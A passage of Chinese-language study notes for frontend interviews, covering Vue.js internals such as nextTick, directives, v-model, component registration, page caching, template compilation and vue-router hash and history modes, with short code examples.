MVVM 框架（to understand）</h3><p><a href="https://www.jianshu.com/p/2436436c1863">https://www.jianshu.com/p/2436436c1863</a> 好难。。</p><h2 id="Vue-中的-nextTick-原理分析"><a href="#Vue-中的-nextTick-原理分析" class="headerlink" title="Vue 中的 nextTick 原理分析"></a>Vue 中的 nextTick 原理分析</h2><p>参考自<a href="https://www.cxyzjd.com/article/qq_42072086/106987202">https://www.cxyzjd.com/article/qq_42072086/106987202</a></p><p>Vue 的 nextTick 其本质是对 JavaScript 执行原理 EventLoop 的一种应用。</p><p>nextTick ：在下次 DOM 更新循环结束之后执行延迟回调，用于获得更新后的 DOM。变量：</p><ol><li>callbacks：用来存储所有需要执行的回调函数</li><li>pending：用来标志是否正在执行回调函数</li><li>timerFunc：用来触发执行回调函数</li></ol><p>当调用 nextTick 方法时会传入两个参数，回调函数和执行回调函数的上下文环境，如果没有提供回调函数，那么将返回 promise 对象。首先将拿到的回调函数存放到数组中，判断是否正在执行回调函数，如果当前没有，那么在 pending 的时候，就会执行 timeFunc（多次执行 nextTick 只会执行一次 timerFunc）。timeFunc 其实就是执行异步的方法，然后异步去执行 flushCallbacks 方法（将传递的函数依次执行）。</p><p>nextTick 多次调用会维持一个数组，之后会异步的把数组中的方法依次执行，这样用户就会在视图更新之后再获取到真实的dom元素。</p><p><img src="https://i.loli.net/2021/10/27/Vq4zSLbRHlCNoiu.png" alt="image.png"></p><h3 id="应用场景？"><a href="#应用场景？" class="headerlink" title="应用场景？"></a>应用场景？</h3><ul><li>在 created() 钩子函数进行的 DOM 操作一定要放在 Vue.nextTick() 的回调函数中。原因是在 created() 钩子函数执行时 DOM 并未进行任何渲染，此时进行 DOM 操作无异于徒劳。（mounted就不需要）</li><li>在数据变化之后要执行的某个操作，比如设置 <code>vm.someData = &#39;new value&#39;</code>，DOM 并不会马上更新，而是在异步队列被清除，也就是下一个事件循环开始，执行更新时才会进行 DOM 更新。如果此时想要根据最新的 DOM 状态去做某些事情，就会出现问题。因此可以在数据变化之后使用 <code>Vue.nextTick(callback)</code> ，这样回调函数在 DOM 更新完成后就会调用。</li></ul><h3 id="Vue-data-某个属性值改变后，视图会立即同步执行渲染吗？（高频）"><a href="#Vue-data-某个属性值改变后，视图会立即同步执行渲染吗？（高频）" class="headerlink" title="Vue data 某个属性值改变后，视图会立即同步执行渲染吗？（高频）"></a>Vue data 某个属性值改变后，视图会立即同步执行渲染吗？（高频）</h3><p>不会。Vue 实现响应式并不是数据发生变化之后 DOM 立即变化，而是按一定的策略进行 DOM 的更新。</p><p><strong>Vue 在更新 DOM 时是异步执行的</strong>。只要侦听到数据变化， Vue 将开启一个队列，并缓冲在同一事件循环中发生的所有数据变更。如果同一个 watcher 被多次触发，只会被推入到队列中一次。这种在缓冲时去除重复数据对于避免不必要的计算和 DOM 操作是非常重要的。</p><p>然后在下一个的事件循环 “tick” 中，Vue 刷新队列并执行实际（已去重的）工作。</p><p>例子：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;example&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">el</span>: <span class="string">&#x27;#example&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">message</span>: <span class="string">&#x27;123&#x27;</span></span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript">    vm.message = <span class="string">&#x27;new message&#x27;</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(vm.$el.textContent) <span class="comment">// 123,页面显示 new message</span></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="介绍一下-vue"><a href="#介绍一下-vue" class="headerlink" title="介绍一下 vue"></a>介绍一下 vue</h2><p>Vue 是一套用于构建用户界面的<strong>渐进式框架</strong>。Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。</p><h2 id="vue-常用的修饰符？"><a href="#vue-常用的修饰符？" class="headerlink" title="vue 常用的修饰符？"></a>vue 常用的修饰符？</h2><ul><li>.prevent：防止执行预设的行为（如果事件可取消，则取消该事件，而不停止事件的进一步传播），等同于 JavaScript 中的 <code>event.preventDefault()</code></li><li>.stop：阻止事件冒泡，等同于 JavaScript 中的 <code>event.stopPropagation()</code></li><li>.self：只在当前元素自身触发处理函数，不包含子元素</li><li>.once：事件只触发一次</li><li>.sync：props 值只能在父组件中更新并传递给子组件，在子组件内部是不允许改变传递进来的props值。可以使用 .sync 修饰符实现在子组件内部改变 props 属性值并更新到父组件中。</li></ul><h3 id="sync-的作用？"><a href="#sync-的作用？" class="headerlink" title=".sync 的作用？"></a>.sync 的作用？</h3><p>.sync修饰符实际上是一个<strong>语法糖</strong>，可以实现子组件与父组件的双向绑定，并且可以实现子组件同步修改父组件的值。<code>:money.sync=&quot;dataApp&quot;</code> 是 <code>:money=&quot;dataApp&quot; v-on:update:money=&quot;dataApp = $event&quot;</code> 的缩写。</p><h2 id="vue-指令？"><a href="#vue-指令？" class="headerlink" title="vue 指令？"></a>vue 指令？</h2><p>参考自 <a href="https://learnku.com/articles/38198">https://learnku.com/articles/38198</a></p><ol><li>v-text：v-text 与插值表达式<code>&#123;&#123;&#125;&#125;`相同的地方是，它也是将数据解析成纯文本（若解释 html 标签可能导致 xss 攻击）但区别是：使用 v-text 在页面加载时不会显示'message'，**解决了插值表达式闪烁问题**。2. v-html：为了输出真正的 HTML，可以用 v-html 指令。它等同于 JS 的 innerHtml 属性，会将数据解析成 html 形式。3. v-if：用于**条件性地渲染**一块内容。这块内容只会在指令的表达式返回 **truthy** 值的时候被渲染。4. v-else：**必须和** `v-if` **连用**，否则会报错。5. v-show：用来**控制元素是否显示**。6. v-for：循环7. v-on：**绑定事件监听器**。8. v-bind：主要用于**绑定属性**，可以动态地绑定一个或多个属性，比如 class 属性、style 属性、value 属性、href 属性。9. v-model：在表单上**创建双向数据绑定**，v-model 会忽略所有表单元素的 value、checked、selected 特性的初始值，因为 v-model 选择 Vue 实例数据来作为具体的值。10. v-pre：会**按原样输出**，标签中的内容是什么就输出什么，主要用来跳过这个元素以及它的子元素的编译过程，可以用来显示原始的 Mustache 标签。11. v-once：关联的实例**只会渲染一次，执行一次性地插值**，当数据改变时，插值处的内容不会更新。若之后牵涉到重新渲染，那么它关联的实例及其所有子节点会被视为静态内容而被跳过，可以用来优化更新性能。### v-show 与 v-if 区别（高频）- **手段**：v-if 是动态的向DOM树内添加或者删除DOM元素；v-show是通过设置DOM元素的display样式属性控制显隐（none、block）。- **编译过程**：v-if切换有一个局部编译/卸载的过程，切换过程中合适地销毁和重建内部的事件监听和子组件；v-show只是简单的基于css切换；- **编译条件**：v-if是惰性的，如果初始条件为假，则什么也不做；只有在条件第一次变为真时才开始局部编译; v-show是在任何条件下，无论首次条件是否为真，都被编译，然后被缓存，而且DOM元素保留；- **性能消耗**：v-if有更高的切换消耗；v-show有更高的初始渲染消耗；- **使用场景**：`v-show` 在初始渲染时有更高的开销，但是切换开销很小，更适合于频繁切换的场景；`v-if` 切换时开销更高，更适合不经常切换的场景基于 `v-if` 的惰性渲染机制，可以在必要的时候才去渲染组件，减少整个页面的初始渲染开销。### v-model 原理v-model 是⽤来在表单控件或者组件上创建双向绑定的，可以看成是 value + input 方法的语法糖，默认为组件绑定名为 value 的 prop 和名为 input 的事件。**1.作用在普通表单元素上：**动态绑定 input 的 value 指向 messgae 变量，并且在触发 input 事件时动态把 message 设置为目标值。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input v-model=<span class="string">&quot;sth&quot;</span> /&gt;</span><br><span class="line"><span class="comment">//  等同于</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> </span></span></span><br><span class="line"><span class="tag"><span class="xml">    <span class="attr">v-bind:value</span>=<span class="string">&quot;message&quot;</span> </span></span></span><br><span class="line"><span class="tag"><span class="xml">    <span class="attr">v-on:input</span>=<span class="string">&quot;message=$event.target.value&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">&gt;</span></span></span><br><span class="line"><span class="xml">//$event.target 指代当前触发的事件对象的dom;</span></span><br><span class="line"><span class="xml">//$event.target.value 当前dom的value值;</span></span><br><span class="line"><span class="xml">//在@input方法中，value =&gt; sth;</span></span><br><span class="line"><span class="xml">//在:value中,sth =&gt; value;</span></span><br></pre></td></tr></table></figure>**2.作用在组件上:**在自定义组件中，v-model 默认会利用名为 value 的 prop 和名为 input 的事件**本质是一个父子组件通信的语法糖，通过prop和$.emit实现**。因此父组件`v-model`语法糖本质上可以修改为 `''`在组件的实现中，可以通过 **v-model属性** 来配置子组件接收的prop名称，以及派发的事件名称。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父组件</span></span><br><span class="line">&lt;aa-input v-model=<span class="string">&quot;aa&quot;</span>&gt;&lt;/aa-input&gt;</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">aa-input</span> <span class="attr">v-bind:value</span>=<span class="string">&quot;aa&quot;</span> <span class="attr">v-on:input</span>=<span class="string">&quot;aa=$event.target.value&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">aa-input</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 子组件：</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-bind:value</span>=<span class="string">&quot;aa&quot;</span> <span class="attr">v-on:input</span>=<span class="string">&quot;onmessage&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">aa-input</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">props:&#123;<span class="attr">value</span>:aa,&#125;</span><br><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">    <span class="function"><span class="title">onmessage</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">        $emit(<span class="string">&#x27;input&#x27;</span>,e.target.value)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>默认情况下，一个组件上的 v-model 会把 value 用作 prop 且把 input 用作 event但是一些输入类型比如单选框和复选框按钮可能想使用 value prop 来达到不同的目的。使用 model 选项可以回避这些情况产生的冲突。js 监听input 输入框输入数据改变，用oninput ,数据改变以后就会立刻出发这个事件。通过input事件把数据$emit 出去，在父组件接受。父组件设置v-model的值为input$emit过来的值。具体见https://github.com/lgwebdream/FE-Interview/issues/914## vue 绑定事件？（to understand）1.原生的事件绑定（见 JS 篇事件绑定），采用的是 addEventListener 实现。2.组件的事件绑定，组件绑定事件采用的是 $on 方法 。在组件上是通过 @click.native 进行绑定https://blog.csdn.net/qq_42072086/article/details/108063281## data 什么时候为对象 || 函数？（高频）**组件复用时**所有组件实例都会共享 `data`，如果 `data` 是对象，就会造成一个组件修改 `data` 以后，影响其他所有组件的后果，所以需要将 `data` 写成函数，每次用到就调用，获得新的数据。**当使用 `new Vue()` 的方式**时，无论将 `data` 设置为对象还是函数都是可以的，因为 `new Vue()` 的方式是生成一个根组件，该组件不会复用，也就不存在共享 `data` 的情况。## 什么是SPA？见 [彻底理清前端单页面应用（SPA）的实现原理 【精读源码】](https://segmentfault.com/a/1190000019936510)SPA单页面应用（SinglePage Web Application），指只有一个主页面的应用，一开始只需要加载一次js、css等相关资源。所有内容都包含在主页面，对每一个功能模块组件化。单页应用跳转，就是切换相关组件，仅仅刷新局部资源。MPA多页面应用 （MultiPage Application），指有多个独立页面的应用，每个页面必须重复加载js、css等相关资源。多页应用跳转，需要整页资源刷新。### SPA 优缺点优点：组件化缺点：- 不利于 SEO（搜索引擎）- 首屏渲染时间长服务端渲染SSR预渲染Prerendering### 单页面和多页面的区别是什么![image.png](https://i.loli.net/2021/10/27/4mnTNfKZRr5tEo7.png)## vue 注册组件的方式**1、全局注册：**<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">&#x27;my-test&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="string">&#x27;&lt;div&gt;&#123;&#123;test&#125;&#125;&lt;/div&gt;&#x27;</span>,</span><br><span class="line">    data () &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">test</span>: <span class="number">1212</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    <span class="attr">template</span>: <span class="string">&#x27;&lt;div id=&quot;app&quot;&gt;&lt;my-test&gt;&lt;my-test/&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>**组件的全局注册需要在全局实例化Vue前调用**，注册之后可以用在任何新创建的 Vue 实例中调用。**2、局部注册：**<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myTest = &#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="string">&#x27;&lt;div&gt;&#123;&#123;test&#125;&#125;&lt;/div&gt;&#x27;</span>,</span><br><span class="line">    data () &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">test</span>: <span class="number">1212</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: &#123;</span><br><span class="line">        myTest</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>当只需要在某个局部用到某个组件时，可以使用局部注册的方式进行组件注册，此时局部注册的组件只能在注册该组件内部使用。## vue 如何保存页面状态（缓存页面）（高频）参考自https://juejin.cn/post/6919373017218809864会出现以下两种情况：- 前组件会被卸载- 前组件不会被卸载### 组件会被卸载**（1）将状态存储在 LocalStorage / SessionStorage**：在组件即将被销毁的生命周期中，通过 JSON.stringify() 把当前组件的 state 储存在 LocalStorage / SessionStorage。（或者使用 beforeunload 监听页面的刷新事件，然后在监听方法里将 Vuex 里的数据储存到 localStorage）<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// created 钩子函数: 在页面加载时读取localStorage里的状态信息</span></span><br><span class="line"><span class="built_in">localStorage</span>.getItem(<span class="string">&quot;userMsg&quot;</span>) &amp;&amp; <span class="built_in">this</span>.$store.replaceState(<span class="built_in">JSON</span>.parse(<span class="built_in">localStorage</span>.getItem(<span class="string">&quot;userMsg&quot;</span>)));</span><br><span class="line">    </span><br><span class="line"><span class="comment">//在页面刷新时将vuex里的信息保存到localStorage里</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&quot;beforeunload&quot;</span>,<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">localStorage</span>.setItem(<span class="string">&quot;userMsg&quot;</span>, <span class="built_in">JSON</span>.stringify(<span class="built_in">this</span>.$store.state))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>**优点：**- 兼容性好，不需要额外库或工具。- 简单快捷，基本可以满足大部分需求。**缺点：**- 状态通过 JSON 方法储存（相当于深拷贝），如果状态中有特殊情况（比如 Date 对象、Regexp 对象等）会得到字符串而不是原来的值。**（2）路由传值**：通过 vue-router 的 prop / to 可以实现路由间传递参数的效果。需要用到 state 参数，在 B 组件中通过 history.location.state 就可以拿到 state 值。返回 A 组件时再次携带 state 达到路由状态保持的效果。**优点：**- 简单快捷，不会污染 LocalStorage / SessionStorage。- 可以传递 Date、RegExp 等特殊对象**缺点：**- 如果 A 组件可以跳转至多个组件，那么在每一个跳转组件内都要写相同的逻辑。### 组件不会被卸载**（1）单页面渲染**：将要切换的组件作为子组件全屏渲染，父组件中正常储存页面状态。**优点：**- 代码量少- 不需要考虑状态传递过程中的错误**缺点：**- 增加 A 组件维护成本- 需要传入额外的 prop 到 B 组件- 无法利用路由定位页面**（2）keep-alive**：缓存页面状态。当组件在 keep-alive 内被切换时组件的 **activated、deactivated** 这两个生命周期钩子函数会被执行，被包裹在 keep-alive 中的组件状态将被保留。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// store/index.js</span></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:  <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/Home.vue&#x27;</span>),</span><br><span class="line">    <span class="comment">// 在路由中添加meta字段</span></span><br><span class="line">    <span class="attr">meta</span>:&#123;</span><br><span class="line">     　　<span class="comment">// 添加keepAlive字段，值true则缓存当前页面，false则不缓存</span></span><br><span class="line">    　　<span class="attr">keepAlive</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]    </span><br><span class="line"><span class="comment">// App.vue</span></span><br><span class="line">&lt;keep-alive&gt;</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">router-view</span>  <span class="attr">v-if</span>=<span class="string">&quot;$route.meta.keepAlive&quot;</span> <span class="attr">class</span>=<span class="string">&quot;app-middle-content&quot;</span>/&gt;</span></span></span><br><span class="line">&lt;/keep-alive&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">router-view</span>  <span class="attr">v-if</span>=<span class="string">&quot;!$route.meta.keepAlive&quot;</span> <span class="attr">class</span>=<span class="string">&quot;app-middle-content&quot;</span>/&gt;</span></span></span><br></pre></td></tr></table></figure>**缺点：**- 刷新浏览器页面时（等于刷新了整个vue实例应用），所有vue缓存的数据都会丢失。## 编译过程vue的模版编译过程主要如下：**template -> ast -> render函数**Vue 会通过编译器将模板编译为 `render` 函数，然后通过执行 `render` 函数生成 Virtual DOM，最终映射为真实 DOM。编译过程分为三个阶段：1. 调用 parse 方法将模板解析为 AST：最主要的事情是**通过各种各样的正则表达式去匹配模板中的内容**，然后将内容提取出来做各种逻辑操作，接下来会生成一个最基本的 AST 对象。根据这个最基本的 AST 对象中的属性进一步扩展 AST。   <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 类型</span></span><br><span class="line">    <span class="attr">type</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="comment">// 标签</span></span><br><span class="line">    tag,</span><br><span class="line">    <span class="comment">// 属性列表</span></span><br><span class="line">    <span class="attr">attrsList</span>: attrs,</span><br><span class="line">    <span class="comment">// 属性映射</span></span><br><span class="line">    <span class="attr">attrsMap</span>: makeAttrsMap(attrs),</span><br><span class="line">    <span class="comment">// 父节点</span></span><br><span class="line">    parent,</span><br><span class="line">    <span class="comment">// 子节点</span></span><br><span class="line">    <span class="attr">children</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>2. 优化 AST：**对静态节点做优化**。对节点进行静态内容提取，也就是将永远不会变动的节点提取出来，实现复用 Virtual DOM，跳过对比算法的功能。3. 将 AST 转换为 `render` 函数### *Vue 中 AST 抽象语法树的运用（to understand）https://juejin.cn/post/6885146952877031432#heading-9## *Vue 热重载？"热重载"不是修改文件的时候简单重新加载页面。启用热重载后，当修改 `.vue` 文件时，所有该组件的实例会被替换，**并且不需要刷新页面**，它甚至保持应用程序和被替换组件的当前状态。## *vue 中 mixin 和 mixins 区别？mixin 用于全局混入，会影响到每个组件实例，通常插件都是这样做初始化的。可以全局混入封装好的 ajax 或者一些工具函数等等。 使用 mixin 混入时：- mixin 的钩子函数会再自己组件的钩子函数之前触发- 对于 methods、computed 这些配置项等，Vue 会进行合并- 对于同名属性，Vue 会用组件里的来覆盖 mixin 的<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.mixin(&#123;</span><br><span class="line">    <span class="function"><span class="title">beforeCreate</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// ...逻辑</span></span><br><span class="line">        <span class="comment">// 这种方式会影响到每个组件的 beforeCreate 钩子函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>mixins 是最常使用的扩展组件的方式。如果多个组件中有相同的业务逻辑，就可以将这些逻辑剥离出来，通过 mixins 混入代码，比如上拉下拉加载数据这种逻辑等等。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mixinObj = &#123;</span><br><span class="line">    <span class="attr">methods</span>: &#123;</span><br><span class="line">        <span class="function"><span class="title">mixinFunc</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="attr">mixins</span>: [mixinObj],</span><br><span class="line">    <span class="function"><span class="title">created</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.mixinFunc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>另外需要注意的是 mixins 混入的钩子函数会先于组件内的钩子函数执行，并且在遇到同名选项的时候也会有选择性的进行合并。## *对SSR的理解SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。SSR的优势：- 更好的SEO- 首屏加载速度更快SSR的缺点：- 开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子；- 当需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境；- 更多的服务端负载。# vue-router **解决的问题：**- 监听 URL 的变化，并在变化前后执行相应的逻辑- 不同的 URL 对应不同组件- 提供多种方式改变 URL 的 API  ( URL 的改变不能导致浏览器刷新)**使用方式：**- 提供一个路由配置表，不同 URL 对应不同组件的配置- 初始化路由实例 new VueRouter()- 挂载到 Vue 实例上- 提供一个路由占位，用来挂载 URL 匹配到的组件 ## Vue 路由跳转的方式？传参？1. router-link：跳转前提是在 router.js 中配置了要跳转到的目的地（to）2. this.$router.push()：函数里面调用，跳转到指定 url 路径，并在 history 栈中添加一个记录，点击后退会返回到上一个页面   - 不传参数：`this.$router.push('/home');`   - query 传参数：`this.$router.push(&#123;name:'home',query: &#123;id:'1'&#125;&#125;);</code> 取参数：<code>$route.query.id</code><ul><li>params 传参数：<code>this.$router.push(&#123;name:&#39;home&#39;,params: &#123;id:&#39;1&#39;&#125;&#125;); </code> 取参数：<code>$route.params.id</code></li><li><strong>两者区别</strong>：<ul><li>query 类似 get, 跳转之后页面 url 会拼接参数，非重要性的可以这样传；刷新页面 id 还在。</li><li>params 类似 post, 跳转之后页面 url 不会拼接参数 , 可用来传密码等；刷新页面 id 消失。</li></ul></li></ul></li><li>this.$router.replace()：用法同 push，跳转到指定 url 路径，但是 history 栈中不会有记录，点击返回会跳转到上个页面，即直接替换了当前页面。</li><li>this.$router.go(n) ：向前或者向后跳转n个页面，n可为正整数或负整数。n 为 0 时强制刷新页面。</li></ol><h2 id="前端路由原理？"><a href="#前端路由原理？" class="headerlink" title="前端路由原理？"></a>前端路由原理？</h2><p>前端路由本质就是<strong>监听 URL 的变化</strong>，然后匹配路由规则，显示相应的页面，并且无须刷新页面。目前前端使用的路由就只有两种实现方式。<img src="https://i.loli.net/2021/09/18/3n8axwlMUWmpNKI.png" alt="image.png"></p><h3 id="Hash-模式（默认）"><a href="#Hash-模式（默认）" class="headerlink" title="Hash 模式（默认）"></a>Hash 模式（默认）</h3><p>使用 URL hash 值来作路由。支持所有浏览器，包括不支持HTML5 History Api的浏览器。</p><p>原理：URL 中 hash 值只是客户端的一种状态。当向服务器端发出请求时，<strong>hash 部分不会被发送</strong>。例如<code>www.test.com/#/</code> 就是 Hash URL。</p><ul><li>hash 值的改变，都会在浏览器的访问历史中增加一个记录，因此能通过浏览器的回退、前进按钮控制 hash 的切换； </li><li>可以通过 a 标签，并设置 href 属性，当用户点击这个标签后，URL 的 hash 值会发生改变；</li><li>可以使用 JavaScript 来对 loaction.hash 进行赋值，改变 URL的 hash 值；</li><li>使用 hashchange 事件来监听 hash 值的变化，从而对页面进行跳转。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;hashchange&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ... 具体逻辑</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="History-模式"><a href="#History-模式" class="headerlink" title="History 模式"></a>History 模式</h3><p>依赖 HTML5 History API 和服务器配置。history 路由模式的实现主要基于下面几个特性：</p><ul><li>history.pushState 和 history.repalceState 实现 URL 的变化 ；</li><li>使用 popState 事件来监听 url 的变化，从而对页面进行跳转；</li><li>history.pushState() 或 history.replaceState() 不会触发 popState 事件（即不引起页面刷新，只会更新浏览器的历史记录），这时需要手动触发页面跳转。</li></ul><h3 id="为什么history模式需要服务器支持？"><a href="#为什么history模式需要服务器支持？" class="headerlink" title="为什么history模式需要服务器支持？"></a>为什么history模式需要服务器支持？</h3><p>具体见 <a href="https://www.cnblogs.com/shapeY/p/14708991.html">vue-router history模式 为什么需要服务端配置以及如何配置</a></p><p>假设应用地址为<code>abc.com</code>，服务端不加额外的配置。当通过<code>abc.com</code>访问时是没有问题的，之后通过 route-link 或者 router.api 来跳转也不会有问题，因为不会刷新页面请求 html，只是通过<code>history.pushState</code>或者<code>history.replaceState</code>来改变history记录，修改地址栏地址而已；</p><p>但是如果直接访问子路由 <code>abc.com/test</code> 时就会有问题，<code>/test</code>是子路由名，但是服务器中并不存在该目录，就无法索引到html文件，就会出现404，所以不管是访问什么路径，都应该加载根目录的html文件。</p><h3 id="两种模式的区别？"><a href="#两种模式的区别？" class="headerlink" title="两种模式的区别？"></a>两种模式的区别？</h3><ul><li>Hash 模式只可以更改 <code>#</code> 后面的内容；History 模式可以通过 API 设置任意的同源 URL。</li><li>Hash 模式只能更改哈希值，也就是字符串；History 模式可以通过 API 添加任意类型的数据到历史记录。</li><li>Hash 模式无需后端配置，并且兼容性好；History 模式在用户手动输入地址或者刷新页面的时候会发起 URL 请求，后端需要配置 <code>index.html</code> 页面用于匹配不到静态资源的时候。</li><li>Hash 模式相对来说更简单，并且兼容性也更好。</li></ul><h3 id="前端路由优缺点？"><a href="#前端路由优缺点？" class="headerlink" title="前端路由优缺点？"></a>前端路由优缺点？</h3><p>优点：用户体验好，不需要每次都从服务器全部获取，快速展现给用户。</p><p>缺点：单页面无法记住之前滚动的位置，无法在前进，后退的时候记住滚动的位置。</p><h2 id="Vue-Router-的懒加载如何实现"><a href="#Vue-Router-的懒加载如何实现" class="headerlink" title="Vue-Router 的懒加载如何实现"></a>Vue-Router 的懒加载如何实现</h2><p>参考自 <a href="https://juejin.cn/post/6964779204462247950/#heading-2">https://juejin.cn/post/6964779204462247950/#heading-2</a></p><p>（1）方案一(常用)：使用箭头函数+import动态加载</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> List = <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;@/components/list.vue&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/list&#x27;</span>, <span class="attr">component</span>: List &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>（2）方案二：使用箭头函数+require动态加载</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> Router(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="attr">path</span>: <span class="string">&#x27;/list&#x27;</span>,</span><br><span class="line">     <span class="attr">component</span>: <span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">require</span>([<span class="string">&#x27;@/components/list&#x27;</span>], resolve)</span><br><span class="line">   &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="vue-router-中的导航钩子函数"><a href="#vue-router-中的导航钩子函数" class="headerlink" title="vue-router 中的导航钩子函数"></a>vue-router 中的导航钩子函数</h2><p>（1）全局钩子函数 <code>router.beforeEach(to,from,next)</code> 和 <code>afterEach</code></p><p>beforeEach 全局前置守卫，代表进入路由之前。有三个参数，to 代表要进入的路由对象，from 代表离开的路由对象。next 是一个必须要执行的函数，如果不传参数，就执行下一个钩子函数，如果传入 false，则终止跳转，如果传入一个路径，则导航到对应的路由，如果传入 error ，则导航终止，error 